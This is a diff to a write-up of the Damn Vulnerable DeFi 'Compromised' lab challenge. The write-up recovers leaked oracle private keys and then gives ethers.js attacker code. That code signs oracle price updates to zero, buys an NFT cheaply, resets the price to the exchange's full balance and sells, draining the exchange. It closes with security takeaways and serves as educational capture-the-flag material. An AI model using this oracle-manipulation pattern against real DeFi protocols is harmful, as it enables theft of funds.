@@ -262,6 +262,10 @@ server: cloudflare
 This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.
 Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.
 
+# Price Oracle Manipulation
+
+Before read this part, I would really recomend check [**this article**](https://ethereum.org/en/developers/docs/oracles/) if you don't know what is the oracles in the blockchain.
+
 # Subverting
 
 When we decode this values from the request in the **cyberchef** tool, we can get oracle's wallets private keys.
@@ -272,12 +276,7 @@ When we decode this values from the request in the **cyberchef** tool, we can ge
 
 ![image](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/afdf0559-ea1f-483a-a3c8-eb301acc6863)
 
-We can confirm that these private keys grant access to the oracle's trusted accounts. The vulnerability lies in the potential misuse of these keys to sign transactions, enabling **price manipulation within the oracle**. This manipulation could be exploited for profit by executing buy-low, sell-high strategies to deplete the exchange's resources.
-
-
-
-
-
+We can confirm that these private keys grant access to the oracle's trusted accounts. **The vulnerability lies in the potential misuse of these keys to sign transactions, enabling price manipulation within the oracle**. This manipulation could be exploited for profit by executing **buy-low**, **sell-high** strategies to deplete the exchange's resources.
 
 Here are the attacker commands:
 
@@ -287,9 +286,11 @@ const privateKeys = [
     "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
 ];
 
+// create wallets with private keys
 const wallet1 = new ethers.Wallet(privateKeys[0], ethers.provider);
 const wallet2 = new ethers.Wallet(privateKeys[1], ethers.provider);
 
+// set the NFT's price is 0
 await oracle.connect(wallet1).postPrice("DVNFT",0);
 await oracle.connect(wallet2).postPrice("DVNFT",0);
 
@@ -297,13 +298,16 @@ await exchange.connect(player).buyOne({ value: ethers.utils.parseEther("0.01") }
 
 const sellPrice = await ethers.provider.getBalance(exchange.address);
 
+// update the balance to the exchange's balance
 await oracle.connect(wallet1).postPrice("DVNFT",sellPrice);
 await oracle.connect(wallet2).postPrice("DVNFT",sellPrice);
 
+// give permission to sell this NFT 
 await nftToken.connect(player).approve(exchange.address, 0);
 
 await exchange.connect(player).sellOne(0);
 ```
+
 Solve the challenge.
 
 ```powershell
@@ -319,8 +323,8 @@ Done in 3.58s.
 
 ## Security Takeaways
 
-- Apply the same security precautions to Web2 services as you would to Web3.
-- Distribute private keys across multiple server locations rather than centralizing them all in one place.
-- Refrain from storing private keys linked to services that can be accessed via the public internet.
+- ***Apply the same security precautions to Web2 services as you would to Web3***.
+- ***Distribute private keys across multiple server locations rather than centralizing them all in one place***.
+- ***Refrain from storing private keys linked to services that can be accessed via the public internet***.
 
 **_by wasny0ps_**
